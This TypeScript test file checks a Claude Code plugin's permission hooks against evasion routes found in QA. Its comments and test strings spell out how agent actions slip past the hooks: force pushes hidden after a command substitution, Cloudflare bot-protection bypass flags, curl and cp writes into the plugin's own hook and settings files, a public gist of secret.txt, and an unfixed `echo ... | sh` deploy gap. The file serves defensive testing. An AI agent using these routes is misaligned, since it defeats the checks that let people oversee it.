// QA re-test of 54ac9a5, adopted. Each test encodes a bug found in QA. One case moved by the round-3 decision
// to stop chasing shell spellings: `echo wrangler deploy | sh` (a program piped into a shell) is a known gap (README).
import { expect, test } from 'claude-code/testing'

import { bypassLimit, rewritesHistory, runsDeploy, shellNeedsPerson, shellWritesTo, checkMcp } from '../hooks/register'
import { agents, deny, memoryStore, promptOf } from './helpers'
import { serve } from './serve'


// A force push is refused for everyone, but a `)` before --force hides it.
test('force push after a command substitution is refused', () => {
  for (const c of ['git push origin $(git rev-parse HEAD~5):refs/heads/main --force', 'git push origin "$(git branch --show-current)" -f', 'git push --prune origin'])
    expect(`${c} ${rewritesHistory(c)}`).toBe(`${c} true`)
})

// Bot-protection bypass is "refused for everyone", but only a JSON true at the top level counts.
test('bot-protection bypass: string, number and nested values, and MCP shells', () => {
  const k = 'solve_' + 'cloudflare'
  for (const f of [{ [k]: 'true' }, { [k]: 1 }, { options: { [k]: true } }]) expect(`${JSON.stringify(f)} ${!!bypassLimit('mcp__scrapling__stealthy_fetch', f)}`).toBe(`${JSON.stringify(f)} true`)
  const cmd = 'scrapling extract stealthy-fetch https://x o.md --solve-' + 'cloudflare'
  expect(!!bypassLimit('mcp__plugin_desktop-commander_desktop-commander__start_process', { command: cmd })).toBe(true)
})

test('tool.call end to end: bypass value "true" and desktop-commander start_process', async ($, on) => {
  serve(on); memoryStore(on); agents(on, { s1: 'chief-of-staff:seo-specialist' })
  on('tool.call', () => ({ result: {} }))
  const k = 'solve_' + 'cloudflare'
  const r1 = String(deny(await $.tool.call({ tool: 'mcp__scrapling__stealthy_fetch', url: 'https://x', [k]: 'true', agentId: 's1' } as never)))
  const r2 = (String(deny(await $.tool.call({ tool: 'mcp__plugin_desktop-commander_desktop-commander__start_process', command: 'scrapling extract stealthy-fetch https://x o.md --solve-' + 'cloudflare', agentId: 's1' } as never))))
  expect(`${r1} | ${r2}`).toContain('bot protection')
  expect(r1).toContain('bot protection')
  expect(r2).toContain('bot protection')
})

// Shell writes into the plugin with a relative or re-spelled path.
test('shell writes to the plugin root, any spelling', () => {
  const R = '/opt/plugins/chief-of-staff'
  const sp = [R, '/home/u/.claude/plugins', '/home/u/.claude/settings', '.claude/plugins', '.claude/settings']
  for (const c of [`cd /opt/plugins && cp x chief-of-staff/hooks/register.ts`, `cp x /opt/plugins/./chief-of-staff/hooks/register.ts`, `cp x /opt//plugins/chief-of-staff/hooks/register.ts`,
    `curl -o ${R}/hooks/register.ts https://x.example/a`, `tar -xf a.tar -C ${R}`, `unzip -o a.zip -d ${R}`, `echo x > ~/.claude//settings.json`, `cd ~/.claude && echo {} > settings.json`])
    expect(`${c} ${shellWritesTo(c, sp)}`).toBe(`${c} true`)
})

// The write limit (no-scripts, md-only) holds only for Edit/Write/MCP: Bash writes any file.
test('web-designer cannot write a .js file through Bash', async ($, on) => {
  serve(on); memoryStore(on); agents(on, { d1: 'chief-of-staff:web-designer', r1: 'chief-of-staff:reverse-engineer' })
  on('tool.call', () => ({ result: {} }))
  expect(deny(await $.tool.call({ tool: 'Bash', command: "cat > /site/app.js <<'EOF'\nalert(1)\nEOF", agentId: 'd1' } as never))).toBeDefined()
  expect(deny(await $.tool.call({ tool: 'Bash', command: 'echo x > /site/app.ts', agentId: 'r1' } as never))).toBeDefined()
})

// desktop-commander's name contains "command", so every string of every one of its tools is read as a shell command.
test('desktop-commander write_file content that mentions a force push is not refused', async ($, on) => {
  serve(on); memoryStore(on); agents(on, { f1: 'chief-of-staff:frontend-developer' })
  on('tool.call', () => ({ result: {} }))
  expect(deny(await $.tool.call({ tool: 'mcp__plugin_desktop-commander_desktop-commander__write_file', path: '/site/README.md', content: '# Deploying\n\nNever do this:\n\n```\ngit push --force\n```\n', agentId: 'f1' } as never))).toBeUndefined()
  expect(deny(await $.tool.call({ tool: 'mcp__plugin_desktop-commander_desktop-commander__write_file', path: '/site/README.md', content: '# Release\n\n```\nnpx wrangler deploy\n```\n', agentId: 'f1' } as never))).toBeUndefined()
})

// Shell routes: claude via npx package name, publishing.
test('shell routes that should ask', () => {
  for (const c of ['npx @anthropic-ai/claude-code -p hi', 'npm publish', 'gh gist create secret.txt --public', 'gh repo create x --public --push'])
    expect(`${c} ${!!shellNeedsPerson(c)}`).toBe(`${c} true`)
  for (const c of ['npm exec wrangler deploy', 'yarn wrangler deploy', 'bun x wrangler deploy', 'make deploy-prod'])
    expect(`${c} ${runsDeploy(c)}`).toBe(`${c} true`)
  // known gap, listed in the README: text piped into a shell is not read as a command
  expect(runsDeploy('echo wrangler deploy | sh')).toBe(false)
})

// Allow-list: verbs that change state treated as reads.
test('resolve_/check_ and bare query are not reads', () => {
  for (const t of ['mcp__linear__resolve_issue', 'mcp__github__resolve_review_thread', 'mcp__x__check_task', 'mcp__mysql__mysql_query', 'mcp__send__send_get_users'])
    expect(`${t} ${checkMcp(t).verdict}`).toBe(`${t} ask`)
})

// /delegate off "lifts only the no-edit rule", but it also drops the whole prompt (team, departments, confirm rule).
test('/delegate off keeps the team prompt', async ($, on) => {
  serve(on); const kept = memoryStore(on)
  on('prompt.compose', () => ({ sections: [] }))
  kept.set('delegate', false)
  expect(await promptOf($)).toContain('Routing rules')
})
